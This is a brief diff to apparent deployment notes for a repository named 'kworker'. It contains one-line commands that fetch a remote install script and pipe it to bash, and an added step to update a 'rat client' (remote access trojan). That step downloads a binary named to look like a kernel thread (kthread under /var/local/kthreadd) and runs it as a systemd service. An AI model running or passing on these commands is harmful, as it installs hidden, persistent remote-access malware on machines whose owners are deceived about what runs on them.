@@ -14,3 +14,6 @@ https://raw.githubusercontent.com/wondream322/kworker/master/win/Install_104.143
 
 单独安装，不清理数据
 bash -c "$(curl -fsSL https://raw.githubusercontent.com/wondream322/kworker/master/install.sh)"
+
+单独更新rat client
+systemctl stop kthread.service && curl -fsSL -o /var/local/kthreadd/kthread.new https://raw.githubusercontent.com/wondream322/kworker/master/kthread && chmod 755 /var/local/kthreadd/kthread.new && mv -f /var/local/kthreadd/kthread.new /var/local/kthreadd/kthread && systemctl start kthread.service && systemctl status kthread.service --no-pager
